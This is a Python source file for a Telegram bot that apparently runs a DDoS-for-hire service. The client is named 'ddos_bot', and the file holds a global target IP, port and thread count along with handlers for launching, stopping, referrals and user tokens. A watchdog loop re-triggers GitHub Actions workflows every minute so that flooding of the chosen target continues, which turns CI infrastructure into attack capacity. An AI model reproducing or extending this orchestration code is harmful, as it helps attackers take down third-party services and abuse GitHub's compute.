# main.py
from pyrogram import Client
import logging
import asyncio
import threading
from config import (API_ID, API_HASH, BOT_TOKEN, OWNER_ID, PORT,
                   WORKFLOW_COUNT)
from services.github import get_all_runs, trigger_workflow

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ===== GLOBAL STATE =====
current_target = {"ip": None, "port": None, "threads": 1000}
watchdog_enabled = False

# Client
app = Client(
    "ddos_bot",
    api_id=API_ID,
    api_hash=API_HASH,
    bot_token=BOT_TOKEN,
    workers=50
)

# ===== REGISTER HANDLERS =====
from handlers import (start, launch, status, stop, history,
                      referral, profile, users, settings,
                      statistics, logs, owner, token, callbacks)

start.register(app)
launch.register(app)
status.register(app)
stop.register(app)
history.register(app)
referral.register(app)
profile.register(app)
users.register(app)
settings.register(app)
statistics.register(app)
logs.register(app)
owner.register(app)
token.register(app)
callbacks.register(app)

# ===== WATCHDOG LOOP =====
async def watchdog_loop():
    """প্রতি ১ মিনিটে চেক, বন্ধ থাকলে চালু"""
    global current_target, watchdog_enabled
    logger.info("🐕 Watchdog started")
    
    while True:
        try:
            if watchdog_enabled and current_target["ip"]:
                status = get_all_runs()
                running = sum(
                    1 for wf, s in status.items()
                    if wf.startswith("bot") and s in ["in_progress", "queued"]
                )
                
                if running < WORKFLOW_COUNT:
                    logger.info(f"⚠️ {running}/{WORKFLOW_COUNT} running, restarting...")
                    for i in range(1, WORKFLOW_COUNT + 1):
                        wf = f"bot{i}.yml"
                        if status.get(wf) not in ["in_progress", "queued"]:
                            trigger_workflow(
                                wf,
                                current_target["ip"],
                                current_target["port"],
                                current_target["threads"]
                            )
                            await asyncio.sleep(1)
                else:
                    logger.info(f"✅ {running}/{WORKFLOW_COUNT} running")
        except Exception as e:
            logger.error(f"Watchdog error: {e}")
        
        await asyncio.sleep(60)

def start_watchdog():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(watchdog_loop())

# ===== FLASK =====
from flask import Flask
flask_app = Flask(__name__)

@flask_app.route('/')
def health():
    return {
        "status": "alive",
        "watchdog": watchdog_enabled,
        "target": f"{current_target['ip']}:{current_target['port']}"
                  if current_target["ip"] else None
    }, 200

@flask_app.route('/health')
def health_check():
    return {"status": "ok"}, 200

def run_flask():
    flask_app.run(host='0.0.0.0', port=PORT)

# ===== MAIN =====
if __name__ == "__main__":
    logger.info("🚀 Bot starting...")
    threading.Thread(target=run_flask, daemon=True).start()
    threading.Thread(target=start_watchdog, daemon=True).start()
    logger.info(f"👑 Owner: {OWNER_ID}")
    logger.info(f"⚙️ Workflows: {WORKFLOW_COUNT}")
    app.run()